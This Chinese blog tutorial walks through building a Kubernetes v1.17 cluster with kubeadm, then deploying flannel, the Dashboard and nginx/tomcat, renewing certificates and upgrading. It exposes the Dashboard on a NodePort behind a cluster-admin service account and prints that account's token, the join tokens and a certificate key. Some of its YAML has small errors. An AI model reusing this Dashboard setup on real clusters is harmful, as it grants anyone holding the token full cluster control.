W0930 17:59:27.921963 6797 validation.go:28] Cannot validate kube-proxy config - no validator is available W0930 17:59:27.922001 6797 validation.go:28] Cannot validate kubelet config - no validator is available k8s.gcr.io/kube-apiserver:v1.17.11 k8s.gcr.io/kube-controller-manager:v1.17.11 k8s.gcr.io/kube-scheduler:v1.17.11 k8s.gcr.io/kube-proxy:v1.17.11 k8s.gcr.io/pause:3.1 k8s.gcr.io/etcd:3.4.3-0 k8s.gcr.io/coredns:1.6.5 由于是国外的镜像，由于网络原因，大概率是下载不成功的。因此将镜像地址换成阿里的，然后手动 pull\ndocker pull registry.cn-hangzhou.aliyuncs.com/google_containers/kube-apiserver:v1.17.11 docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/kube-controller-manager:v1.17.11 docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/kube-scheduler:v1.17.11 docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/kube-proxy:v1.17.11 docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/etcd:3.4.3-0 docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/coredns:1.6.5 2.7 k8s 单节点部署 2.7.1 开始部署 首先给 master-01 添加一个快照，名为 init，方便后续回退\n这里选择 master-01 进行演示\n[root@master-01 ~]# kubeadm init --apiserver-advertise-address=10.0.0.11 --apiserver-bind-port=6443 --kubernetes-version=v1.17.11 --pod-network-cidr=10.100.0.0/16 --service-cidr=10.200.0.0/16 --service-dns-domain=example.local --image-repository=registry.cn-hangzhou.aliyuncs.com/google_containers # --v=6 如果卡住或者超时可以加该选项来查看详细报错信息 安装结果打印在控制台，为方便后续添加 node 节点到集群等操作，最好将打印结果进行保存\n... Your Kubernetes control-plane has initialized successfully! To start using your cluster, you need to run the following as a regular user: # 执行以下三行命令，可通过 kubectl 命令操作集群 mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config You should now deploy a pod network to the cluster. Run \u0026#34;kubectl apply -f [podnetwork].yaml\u0026#34; with one of the options listed at: https://kubernetes.io/docs/concepts/cluster-administration/addons/ Then you can join any number of worker nodes by running the following on each as root: # node 节点运行该命令可加入集群 kubeadm join 10.0.0.11:6443 --token s14pux.a81q4ai54mpumsz4 \\ --discovery-token-ca-cert-hash sha256:5ab171bccb95245c209ddcbb614ae943b31b05e3a4ce2eb47d349655955c185f 2.7.2 验证结果 [root@master-01 ~]# kubectl get pod The connection to the server localhost:8080 was refused - did you specify the right host or port? [root@master-01 ~]# [root@master-01 ~]# mkdir -p $HOME/.kube [root@master-01 ~]# sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config [root@master-01 ~]# sudo chown $(id -u):$(id -g) $HOME/.kube/config [root@master-01 ~]# kubectl get pod No resources found in default namespace. 2.7.3 部署网络组件 k8s 支持的网络组件：安装扩展（Addon） | Kubernetes\n这里选择部署 flannel-io/flannel: flannel is a network fabric for containers, designed for Kubernetes (github.com)\n下载 yaml 文件并修改 network 为集群初始化时规划的 pod 网段 10.100.0.0/16\n[root@master-01 ~]# wget https://github.com/flannel-io/flannel/releases/latest/download/kube-flannel.yml [root@master-01 ~]# grep -m 1 Network kube-flannel.yml \u0026#34;Network\u0026#34;: \u0026#34;10.100.0.0/16\u0026#34;, 开始部署\n[root@master-01 ~]# kubectl apply -f kube-flannel.yml namespace/kube-flannel created serviceaccount/flannel created clusterrole.rbac.authorization.k8s.io/flannel created clusterrolebinding.rbac.authorization.k8s.io/flannel created configmap/kube-flannel-cfg created daemonset.apps/kube-flannel-ds created # 成功部署 [root@master-01 ~]# kubectl get pod -A | grep flannel kube-flannel kube-flannel-ds-zvcp7 1/1 Running 0 2m9s 去除 master-01 的污点\n# 默认情况下 master 被打上了污点，不会被调度 [root@master-01 ~]# kubectl describe node master-01.example.local | grep Taints Taints: node-role.kubernetes.io/master:NoSchedule # 去除 master-01 的污点 [root@master-01 ~]# kubectl taint nodes master-01.example.local node-role.kubernetes.io/master:NoSchedule- node/master-01.example.local untainted 部署 busybox 验证 pod 网络\n[root@master-01 ~]# kubectl run my-container --image=busybox --command -- bash kubectl run --generator=deployment/apps.v1 is DEPRECATED and will be removed in a future version. Use kubectl run --generator=run-pod/v1 or kubectl create instead. [root@master-01 ~]# kubectl run my-container --image=busybox --command -- ping www.baidu.com kubectl run --generator=deployment/apps.v1 is DEPRECATED and will be removed in a future version. Use kubectl run --generator=run-pod/v1 or kubectl create instead. deployment.apps/my-container created [root@master-01 ~]# kubectl get pod NAME READY STATUS RESTARTS AGE my-container-84ff747745-sjd97 1/1 Running 0 10s # 网络正常 [root@master-01 ~]# kubectl exec -it my-container-84ff747745-sjd97 -- sh / # ping www.baidu.com -c 3 PING www.baidu.com (14.119.104.189): 56 data bytes 64 bytes from 14.119.104.189: seq=0 ttl=127 time=9.193 ms 64 bytes from 14.119.104.189: seq=1 ttl=127 time=9.475 ms 64 bytes from 14.119.104.189: seq=2 ttl=127 time=9.668 ms 2.8 k8s 多节点部署（高可用） 这里将用到所有三个 master 节点进行演示，由于 mater-01 部署了单节点，首先将其还原到快照 init （没有快照的话，可以参考 kubeadm reset )\n2.8.1 开始部署 相比单节点部署而言，多了一个选项 --control-plane-endpoint=10.0.0.188 指定了高可用反向代理的 VIP，这里还是选择 master-01 创建集群（任选一个 master 节点均可）\n如果负载均衡器未配置正确，会有以下报错：\nOct 1 14:06:58 master-01 kubelet: E1001 14:06:58.218726 2977 reflector.go:153] k8s.io/client-go/informers/factory.go:135: Failed to lisriver: Get https://load-balancer.example.com:6443/apis/storage.k8s.io/v1beta1/csidrivers?limit=500\u0026amp;resourceVersion=0: EOF\n[root@master-01 ~]# echo 10.0.0.188 load-balancer.example.com \u0026gt;\u0026gt; /etc/hosts [root@master-01 ~]# kubeadm init --apiserver-advertise-address=10.0.0.11 --control-plane-endpoint=load-balancer.example.com --apiserver-bind-port=6443 --kubernetes-version=v1.17.11 --pod-network-cidr=10.100.0.0/16 --service-cidr=10.200.0.0/16 --service-dns-domain=example.local --image-repository=registry.cn-hangzhou.aliyuncs.com/google_containers ... Your Kubernetes control-plane has initialized successfully! To start using your cluster, you need to run the following as a regular user: mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config You should now deploy a pod network to the cluster. Run \u0026#34;kubectl apply -f [podnetwork].yaml\u0026#34; with one of the options listed at: https://kubernetes.io/docs/concepts/cluster-administration/addons/ You can now join any number of control-plane nodes by copying certificate authorities and service account keys on each node and then running the following as root: # 添加 master 节点到集群 kubeadm join load-balancer.example.com:6443 --token iata77.l5yqheznrbz3i0jm \\ --discovery-token-ca-cert-hash sha256:9cf6a8410183e55ff71f0f64f0aea35f3a1498e3e0e6311cf0571a3a2021931a \\ --control-plane # 需要手动生成 Then you can join any number of worker nodes by running the following on each as root: # 添加 node 节点到集群 kubeadm join load-balancer.example.com:6443 --token iata77.l5yqheznrbz3i0jm \\ --discovery-token-ca-cert-hash sha256:9cf6a8410183e55ff71f0f64f0aea35f3a1498e3e0e6311cf0571a3a2021931a # 准备集群认证文件 [root@master-01 ~]# mkdir -p $HOME/.kube [root@master-01 ~]# sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config [root@master-01 ~]# sudo chown $(id -u):$(id -g) $HOME/.kube/config # 成功获取集群信息 [root@master-01 ~]# kubectl get node NAME STATUS ROLES AGE VERSION master-01.example.local Ready master 91m v1.17.11 # 部署 flannel， 参考 2.7.3 [root@master-01 ~]# kubectl apply -f kube-flannel.yml namespace/kube-flannel created serviceaccount/flannel created clusterrole.rbac.authorization.k8s.io/flannel created clusterrolebinding.rbac.authorization.k8s.io/flannel created configmap/kube-flannel-cfg created daemonset.apps/kube-flannel-ds created [root@master-01 ~]# kubectl get pod -A |grep flannel kube-flannel kube-flannel-ds-97c97 1/1 Running 0 94s 补充： 除了使用命令的方式，还可以基于 yaml 文件进行集群的初始化（这里仅给出关键命令）\n# 生成初始化配置 # kubeadm config print init-defaults \u0026gt; cluster-init.yaml # 根据需要修改配置文件 # cat cluster-init.yaml apiVersion: kubeadm.k8s.io/v1beta2 bootstrapTokens: - groups: - system:bootstrappers:kubeadm:default-node-token token: abcdef.0123456789abcdef ttl: 24h0m0s usages: - signing - authentication kind: InitConfiguration localAPIEndpoint: advertiseAddress: 1.2.3.4 bindPort: 6443 nodeRegistration: criSocket: /var/run/dockershim.sock name: master-01.example.local taints: - effect: NoSchedule key: node-role.kubernetes.io/master --- apiServer: timeoutForControlPlane: 4m0s apiVersion: kubeadm.k8s.io/v1beta2 certificatesDir: /etc/kubernetes/pki clusterName: kubernetes controllerManager: {} dns: type: CoreDNS etcd: local: dataDir: /var/lib/etcd imageRepository: k8s.gcr.io kind: ClusterConfiguration kubernetesVersion: v1.17.0 networking: dnsDomain: cluster.local podSubnet: 10.100.0.0/16 serviceSubnet: 10.200.0.0/16 scheduler: {} # 创建集群 kubeadm init --config cluster-init.yaml 2.8.2 添加 master 节点 生成 --control-plane 参数所需 key\n[root@master-01 ~]# kubeadm init phase upload-certs --upload-certs I1001 16:10:41.762369 58794 version.go:251] remote version is much newer: v1.28.2; falling back to: stable-1.17 W1001 16:10:46.609771 58794 validation.go:28] Cannot validate kube-proxy config - no validator is available W1001 16:10:46.609786 58794 validation.go:28] Cannot validate kubelet config - no validator is available [upload-certs] Storing the certificates in Secret \u0026#34;kubeadm-certs\u0026#34; in the \u0026#34;kube-system\u0026#34; Namespace [upload-certs] Using certificate key: c67c9859d32c5f7e1fd75cfca8569aac32ae4f9344fcd6b8d53ad9b998362e05 # 这就是需要的 key 分别执行以下命令，将 master-02 和 master-03 加入 control-plane\n# echo 10.0.0.188 load-balancer.example.com \u0026gt;\u0026gt; /etc/hosts # kubeadm join load-balancer.example.com:6443 --token iata77.l5yqheznrbz3i0jm \\ --discovery-token-ca-cert-hash sha256:9cf6a8410183e55ff71f0f64f0aea35f3a1498e3e0e6311cf0571a3a2021931a \\ --control-plane --certificate-key c67c9859d32c5f7e1fd75cfca8569aac32ae4f9344fcd6b8d53ad9b998362e05 ... This node has joined the cluster and a new control plane instance was created: * Certificate signing request was sent to apiserver and approval was received. * The Kubelet was informed of the new secure connection details. * Control plane (master) label and taint were applied to the new node. * The Kubernetes control plane instances scaled up. * A new etcd member was added to the local/stacked etcd cluster. To start administering your cluster from this node, you need to run the following as a regular user: mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config Run \u0026#39;kubectl get nodes\u0026#39; to see this node join the cluster. # 成功加入节点 [root@master-02 ~]# kubectl get nodes NAME STATUS ROLES AGE VERSION master-01.example.local Ready master 132m v1.17.11 master-02.example.local Ready master 8m25s v1.17.11 master-03.example.local Ready master 14s v1.17.11 2.8.3 添加 node 节点 分别各个 node 节点执行以下命令\necho 10.0.0.188 load-balancer.example.com \u0026gt;\u0026gt; /etc/hosts kubeadm join load-balancer.example.com:6443 --token iata77.l5yqheznrbz3i0jm \\ --discovery-token-ca-cert-hash sha256:9cf6a8410183e55ff71f0f64f0aea35f3a1498e3e0e6311cf0571a3a2021931a 添加完成后的结果\n[root@master-02 ~]# kubectl get nodes NAME STATUS ROLES AGE VERSION master-01.example.local Ready master 176m v1.17.11 master-02.example.local Ready master 52m v1.17.11 master-03.example.local Ready master 44m v1.17.11 node-01.example.local Ready \u0026lt;none\u0026gt; 95s v1.17.11 node-02.example.local Ready \u0026lt;none\u0026gt; 34m v1.17.11 node-03.example.local Ready \u0026lt;none\u0026gt; 74s v1.17.11 2.8.4 查看集群证书 [root@master-02 ~]# kubectl get csr NAME AGE REQUESTOR CONDITION csr-4fsl6 47m system:bootstrap:tdi58m Approved,Issued csr-hc9g7 4m system:bootstrap:tdi58m Approved,Issued csr-jh7gj 55m system:bootstrap:tdi58m Approved,Issued csr-k8psl 3m39s system:bootstrap:tdi58m Approved,Issued csr-qcjln 36m system:bootstrap:tdi58m Approved,Issued csr-vvtfq 2m53s system:bootstrap:tdi58m Approved,Issued 2.8.5 创建 pod 验证集群网络 [root@master-01 ~]# kubectl run net-test --image=alpine sleep 3600 kubectl run --generator=deployment/apps.v1 is DEPRECATED and will be removed in a future version. Use kubectl run --generator=run-pod/v1 or kubectl create instead. deployment.apps/net-test created [root@master-01 ~]# kubectl get pod -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES net-test-88ff4d957-rnrsk 1/1 Running 0 21s 10.100.4.2 node-01.example.local \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; [root@master-01 ~]# kubectl exec -it net-test-88ff4d957-rnrsk -- sh / # ping www.baidu.com PING www.baidu.com (14.119.104.189): 56 data bytes 64 bytes from 14.119.104.189: seq=0 ttl=127 time=8.608 ms 64 bytes from 14.119.104.189: seq=1 ttl=127 time=9.249 ms 64 bytes from 14.119.104.189: seq=2 ttl=127 time=9.576 ms 三、部署 Dashboard 3.1 准备配置文件 [root@master-01 ~]# wget https://raw.githubusercontent.com/kubernetes/dashboard/v2.2.0/aio/deploy/recommended.yaml [root@master-01 ~]# mv recommended.yaml dashboard.yaml # 默认的是以 ClusterIP 发布的，只能集群内访问。这里将其改为 NodePort 的方式部署 [root@master-01 ~]# grep NodePort -C 10 dashboard.yaml --- kind: Service apiVersion: v1 metadata: labels: k8s-app: kubernetes-dashboard name: kubernetes-dashboard namespace: kubernetes-dashboard spec: type: NodePort # 新增 ports: - port: 443 targetPort: 8443 nodePort: 30000 # 新增 selector: k8s-app: kubernetes-dashboard --- apiVersion: v1 kind: Secret metadata: labels: k8s-app: kubernetes-dashboard 3.2 部署并验证效果 [root@master-01 ~]# kubectl apply -f dashboard.yaml # 查看 pod 和 service 服务状态 [root@master-01 ~]# kubectl get pod,svc -n kubernetes-dashboard -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES pod/dashboard-metrics-scraper-894c58c65-tsqb7 1/1 Running 0 32m 10.100.4.4 node-01.example.local \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; pod/kubernetes-dashboard-fc4fc66cc-vvbht 1/1 Running 0 32m 10.100.4.3 node-01.example.local \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTOR service/dashboard-metrics-scraper ClusterIP 10.200.205.233 \u0026lt;none\u0026gt; 8000/TCP 32m k8s-app=dashboard-metrics-scraper service/kubernetes-dashboard NodePort 10.200.198.74 \u0026lt;none\u0026gt; 443:30000/TCP 32m k8s-app=kubernetes-dashboard # 节点监听了 30000 端口 [root@node-01 ~]# ss -ntl |grep 30000 LISTEN 0 32768 [::]:30000 [::]:* 由于是 https 协议，但是证书是私有的，使用 chrome 或 edge 浏览器无法访问 dashboard。因此选择 firefox 浏览器进行访问\n访问 dashboard 需要使用 token 或者 kubeconfig 文件进行认证，这里选择 token 进行验证。下面开始生成 token\n# 创建账号 [root@master-01 ~]# kubectl create serviceaccount dashboard-admin -n kubernetes-dashboard serviceaccount/dashboard-admin created # 授权 [root@master-01 ~]# kubectl create clusterrolebinding dashboard-admin-rb --clusterrole=cluster-admin --serviceaccount=kubernetes-dashboard:dashboard-admin # 获取账号 token [root@master-01 ~]# kubectl get secrets -n kubernetes-dashboard | grep dashboard-admin dashboard-admin-token-wr4jl kubernetes.io/service-account-token 3 15s [root@master-01 ~]# kubectl describe secrets dashboard-admin-token-wr4jl -n kubernetes-dashboard Name: dashboard-admin-token-wr4jl Namespace: kubernetes-dashboard Labels: \u0026lt;none\u0026gt; Annotations: kubernetes.io/service-account.name: dashboard-admin kubernetes.io/service-account.uid: 66e3f61f-9172-400c-b454-d9fb1a93be4c Type: kubernetes.io/service-account-token Data ==== ca.crt: 1025 bytes namespace: 20 bytes token: eyJhbGciOiJSUzI1NiIsImtpZCI6IndQay1pc3ctc3RyWDh3dXQtTHR1N09PLVVBdUExdXJkRVRQeFpmbWlmQ1kifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkYXNoYm9hcmQtYWRtaW4tdG9rZW4tN3NweDkiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGFzaGJvYXJkLWFkbWluIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMjQ5OTJlMzctNmI1Yi00ODZmLTkwYmUtYmQxYTU2NGM0MmJhIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmVybmV0ZXMtZGFzaGJvYXJkOmRhc2hib2FyZC1hZG1pbiJ9.jXYf6lQQBW9kb3KUYpoAi57JbBFwMkUdx3Gb0jK4sN8E80WIM6lyGLktsTCmNoS21BN-bGyusqT5nNJAPhrVYaEjF6pSSLrd49LHF0Wetv04Jh5fdw-aHYuR15QKCZgGjedzuUHD4F8-6Ba5ZqMh67JjKI3Dhb-dIuBIVN3KLi2_D62F4VoCryZB3ExVfdRqZmQmI0EJ5XursMgCzL9v9VCPw9FatL604n5658CuXQNXc6uIpAVwuf3G_4uBoRQ-LcyPXov9JIoSv-qbxnotgZ2xXcHWZ7HIxa1pCRL8YG_bx03ZUE04GebjF9yNeki9Dxsp4gIxDcr09ByzO0gmgg 将上述 token 填入输入框(不要带多余空格），成功访问 dashboard\n四、k8s 部署 nginx + tomcat Deployments | Kubernetes\n目标：实现动静分离的效果，这里仅演示简单的实现效果\n4.1 部署 nginx [root@master-01 nginx]# pwd /root/yaml/nginx [root@master-01 nginx]# cat nginx.yml apiVersion: apps/v1 kind: Deployment metadata: namespace: default name: nginx-deployment labels: app: nginx spec: replicas: 1 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx:1.18.0 ports: - containerPort: 80 --- apiVersion: v1 kind: Service metadata: labels: app: nginx-service-labels name: nginx-service namespace: default spec: type: NodePort ports: - name: http-nginx port: 80 protocol: TCP targetPort: 80 nodeport: 30004 selector: app: nginx [root@master-01 nginx]# kubectl apply -f nginx.yml 查看部署结果\n[root@master-01 nginx]# kubectl get pod,svc -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES pod/nginx-deployment-d44c4d8f4-bftm4 1/1 Running 0 4m11s 10.100.3.3 node-01.example.local \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTOR service/kubernetes ClusterIP 10.200.0.1 \u0026lt;none\u0026gt; 443/TCP 162m \u0026lt;none\u0026gt; service/nginx-service NodePort 10.200.231.164 \u0026lt;none\u0026gt; 80:30004/TCP 4m11s app=nginx 根据以上结果可知，nginx 成功部署，且 pod 被调度到了 node-01 节点\n4.2 部署 tomcat [root@master-01 tomcat]# pwd /root/yaml/tomcat [root@master-01 tomcat]# cat tomcat.yml apiVersion: apps/v1 kind: Deployment metadata: namespace: default name: tomcat-deployment labels: apps: tomcat spec: replicas: 1 selector: matchLabels: app: tomcat template: metadata: labels: app: tomcat spec: containers: - name: tomcat image: tomcat ports: - containerPort: 8080 --- apiVersion: v1 kind: Service metadata: labels: app: tomcat-service-label name: tomcat-service namespace: spec: type: NodePort ports: - name: tomcat-http port: 80 protocol: TCP targetPort: 8080 nodePort: 30005 selector: app: tomcat [root@master-01 tomcat]# kubectl apply -f tomcat.yml 查看部署结果\n[root@master-01 ~]# kubectl get pod,svc -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES pod/nginx-deployment-d44c4d8f4-bftm4 1/1 Running 0 4m11s 10.100.3.3 node-01.example.local \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; pod/tomcat-deployment-78c89857d6-9qtr9 1/1 Running 0 4m14s 10.100.3.2 node-01.example.local \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTOR service/kubernetes ClusterIP 10.200.0.1 \u0026lt;none\u0026gt; 443/TCP 162m \u0026lt;none\u0026gt; service/nginx-service NodePort 10.200.231.164 \u0026lt;none\u0026gt; 80:30004/TCP 4m11s app=nginx service/tomcat-service NodePort 10.200.206.119 \u0026lt;none\u0026gt; 80:30005/TCP 4m14s app=tomcat 生成一个tomcat 临时页面\n[root@master-01 yaml]# kubectl get pod NAME READY STATUS RESTARTS AGE nginx-deployment-d44c4d8f4-bftm4 1/1 Running 0 6m18s tomcat-deployment-78c89857d6-9qtr9 1/1 Running 0 6m21s [root@master-01 yaml]# [root@master-01 yaml]# kubectl exec -it tomcat-deployment-78c89857d6-9qtr9 bash root@tomcat-deployment-78c89857d6-9qtr9:/usr/local/tomcat# cd webapps root@tomcat-deployment-78c89857d6-9qtr9:/usr/local/tomcat/webapps# mkdir tomcat root@tomcat-deployment-78c89857d6-9qtr9:/usr/local/tomcat/webapps# echo \u0026#34;Tomcat test page for pod of k8s~\u0026#34; \u0026gt; tomcat/index.html root@tomcat-deployment-78c89857d6-9qtr9:/usr/local/tomcat/webapps# exit exit 4.3 从 dashboard 查看结果 4.4 配置 nginx 实现动静分离 [[root@master-01 ~]# kubectl get pod,svc NAME READY STATUS RESTARTS AGE pod/net-test-88ff4d957-krc9v 1/1 Running 0 44m pod/nginx-deployment-d44c4d8f4-bftm4 1/1 Running 0 70m pod/tomcat-deployment-78c89857d6-9qtr9 1/1 Running 0 70m NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE service/kubernetes ClusterIP 10.200.0.1 \u0026lt;none\u0026gt; 443/TCP 3h49m service/nginx-service NodePort 10.200.231.164 \u0026lt;none\u0026gt; 80:30004/TCP 70m service/tomcat-service NodePort 10.200.206.119 \u0026lt;none\u0026gt; 80:30005/TCP 70m [root@master-01 ~]# kubectl exec -it nginx-deployment-d44c4d8f4-bftm4 bash root@nginx-deployment-d44c4d8f4-bftm4:/# root@nginx-deployment-d44c4d8f4-sfslr:/# cat \u0026gt; /etc/nginx/conf.d/default.conf \u0026lt;\u0026lt; EOF server { listen 80; listen [::]:80; server_name localhost; location /tomcat { proxy_pass http://tomcat-service.default.svc.example.local; } error_page 500 502 503 504 /50x.html; location = /50x.html { root /usr/share/nginx/html; } } EOF root@nginx-deployment-d44c4d8f4-bftm4:/# nginx -t nginx: the configuration file /etc/nginx/nginx.conf syntax is ok nginx: configuration file /etc/nginx/nginx.conf test is successful root@nginx-deployment-d44c4d8f4-bftm4:/# nginx -s reload 2023/10/02 11:44:15 [notice] 997#997: signal process started 五、k8s 集群管理 5.1 token 管理 [root@master-01 ~]# kubeadm # 双击 tab 补全得到的结果 alpha completion config init join reset token upgrade version [root@master-01 ~]# kubeadm token create delete generate list 5.2 reset 命令 在初始化集群时，如果生成了错误的配置，可以用该命令重置环境\n[root@master-01 ~]# kubeadm reset kubeadm reset 命令用于将Kubernetes节点（通常是工作节点）恢复到其初始状态，将节点从Kubernetes集群中分离并清理集群相关的配置和数据。这个命令的主要作用包括：\n节点的脱离集群：kubeadm reset 会将节点从Kubernetes集群中分离。这包括删除节点的证书、从集群中删除节点的信息，并且节点将不再参与集群中的通信和管理。\n清理配置文件：它会删除Kubernetes的配置文件，例如kubeconfig文件，以及CNI（容器网络接口）插件的配置，以确保不再影响Kubernetes集群。\n清理数据：kubeadm reset 还会清理节点上的Kubernetes数据，包括删除容器、卷、数据存储等，以确保节点不再包含与Kubernetes集群相关的残留数据。\n这个命令通常在以下情况下使用：\n当你需要卸载或移除节点上的Kubernetes时，可以使用 kubeadm reset 来清理节点，然后重新配置或重新部署Kubernetes。\n在测试环境中，当你需要重置一个节点以进行新的Kubernetes集群配置时，可以使用 kubeadm reset。\n请注意，kubeadm reset 只应该用于节点级别的操作，并且在生产环境中使用时需要谨慎，因为它会删除节点上的Kubernetes相关数据。如果你需要从整个Kubernetes集群中移除节点，请首先使用 kubectl drain 命令将节点上的工作负载迁移到其他节点，然后再使用 kubeadm reset 进行节点的重置和卸载。\n5.3 查看证书有效期 [root@master-01 ~]# kubeadm alpha certs kubeconfig kubelet selfhosting [root@master-01 ~]# kubeadm alpha certs certificate-key check-expiration renew # 检查证书是否过期，可以发现 kubeadm 部署的集群，证书有效期为 365d（一年） [root@master-01 ~]# kubeadm alpha certs check-expiration [check-expiration] Reading configuration from the cluster... [check-expiration] FYI: You can look at this config file with \u0026#39;kubectl -n kube-system get cm kubeadm-config -oyaml\u0026#39; CERTIFICATE EXPIRES RESIDUAL TIME CERTIFICATE AUTHORITY EXTERNALLY MANAGED admin.conf Oct 01, 2024 07:58 UTC 364d no apiserver Oct 01, 2024 07:58 UTC 364d ca no apiserver-etcd-client Oct 01, 2024 07:58 UTC 364d etcd-ca no apiserver-kubelet-client Oct 01, 2024 07:58 UTC 364d ca no controller-manager.conf Oct 01, 2024 07:58 UTC 364d no etcd-healthcheck-client Oct 01, 2024 07:58 UTC 364d etcd-ca no etcd-peer Oct 01, 2024 07:58 UTC 364d etcd-ca no etcd-server Oct 01, 2024 07:58 UTC 364d etcd-ca no front-proxy-client Oct 01, 2024 07:58 UTC 364d front-proxy-ca no scheduler.conf Oct 01, 2024 07:58 UTC 364d no CERTIFICATE AUTHORITY EXPIRES RESIDUAL TIME EXTERNALLY MANAGED ca Sep 29, 2033 07:58 UTC 9y no etcd-ca Sep 29, 2033 07:58 UTC 9y no front-proxy-ca Sep 29, 2033 07:58 UTC 9y no 5.4 更新证书有效期 参考链接：\nhttps://www.qikqiak.com/post/update-k8s-10y-expire-certs/\nhttps://www.chenshaowen.com/blog/how-to-renew-kubernetes-certs-manually.html\n[root@master-01 ~]# kubeadm alpha certs renew admin.conf apiserver-etcd-client etcd-healthcheck-client front-proxy-client all apiserver-kubelet-client etcd-peer scheduler.conf apiserver controller-manager.conf etcd-server # 更新所有证书 [root@master-01 ~]# kubeadm alpha certs renew all 完成后重启 kube-apiserver、kube-controller、kube-scheduler 这 3个容器即可，我们可以查看 apiserver 的证书的有效期来验证是否更新成功：\n[root@master-01 ~]# docker ps |egrep \u0026#34;k8s_kube-apiserver|k8s_kube-scheduler|k8s_kube-controller\u0026#34;|awk \u0026#39;{print $1}\u0026#39;|xargs docker restart c2d987734f5a 043af8733130 5a87240ba97a [root@master-01 ~]# echo | openssl s_client -showcerts -connect 127.0.0.1:6443 -servername api 2\u0026gt;/dev/null | openssl x509 -noout -enddate notAfter=Oct 1 13:17:56 2024 GMT 六、k8s 集群升级 kubeadm 部署的集群需要用 kubeadm 来升级，首先需要将 kubeadm 升级到目标版本，然后再继续其他操作。\n6.1 升级准备 本次升级，目标版本：v1.19.2\n查看当前版本\n[root@master-01 ~]# kubeadm version kubeadm version: \u0026amp;version.Info{Major:\u0026#34;1\u0026#34;, Minor:\u0026#34;17\u0026#34;, GitVersion:\u0026#34;v1.17.11\u0026#34;, GitCommit:\u0026#34;ea5f00d93211b7c80247bf607cfa422ad6fb5347\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, BuildDate:\u0026#34;2020-08-13T15:17:52Z\u0026#34;, GoVersion:\u0026#34;go1.13.15\u0026#34;, Compiler:\u0026#34;gc\u0026#34;, Platform:\u0026#34;linux/amd64\u0026#34;} # 查看 yum 源是否有目标版本 [root@master-01 ~]# yum list kubectl kubeadm kubelet --showduplicates | grep 1.19.2 kubeadm.x86_64 1.19.2-0 kubernetes kubectl.x86_64 1.19.2-0 kubernetes kubelet.x86_64 1.19.2-0 kubernetes 6.2 升级 master 节点 滚动式升级 master 节点\n# 安装部署工具 yum install -y kubelet-1.19.2 kubectl-1.19.2 kubeadm-1.19.2 [root@master-01 ~]# kubeadm version kubeadm version: \u0026amp;version.Info{Major:\u0026#34;1\u0026#34;, Minor:\u0026#34;19\u0026#34;, GitVersion:\u0026#34;v1.19.2\u0026#34;, GitCommit:\u0026#34;f5743093fd1c663cb0cbc89748f730662345d44d\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, BuildDate:\u0026#34;2020-09-16T13:38:53Z\u0026#34;, GoVersion:\u0026#34;go1.15\u0026#34;, Compiler:\u0026#34;gc\u0026#34;, Platform:\u0026#34;linux/amd64\u0026#34;} 查看版本升级计划\n[root@master-01 ~]# kubeadm upgrade plan [upgrade/config] Making sure the configuration is correct: [upgrade/config] Reading configuration from the cluster... [upgrade/config] FYI: You can look at this config file with \u0026#39;kubectl -n kube-system get cm kubeadm-config -oyaml\u0026#39; [upgrade/config] FATAL: this version of kubeadm only supports deploying clusters with the control plane version \u0026gt;= 1.18.0. Current version: v1.17.11 # 版本低于 1.18.0，kubeadm 不支持升级操作 To see the stack trace of this error execute with --v=5 or higher 如果选择的版本符合 kubeadm 的要求，则继续以下操作\n[root@master-01 ~]# kubeadm upgrade apply v1.19.2 升级完成后，可以查看镜像版本\n# docker images 6.3 升级 node 节点 同样是滚动升级的方式进行\n# 安装部署工具 yum install -y kubelet-1.19.2 kubectl-1.19.2 kubeadm-1.19.2 # 执行升级操作 kubeadm upgrade node --kubelet-version 1.19.2 ","permalink":"https://senmer.github.io/zh/posts/tech/kubernetes/kubeadm%E9%83%A8%E7%BD%B2k8s%E9%9B%86%E7%BE%A4/","summary":"一、 简介 1.1 k8s 是什么 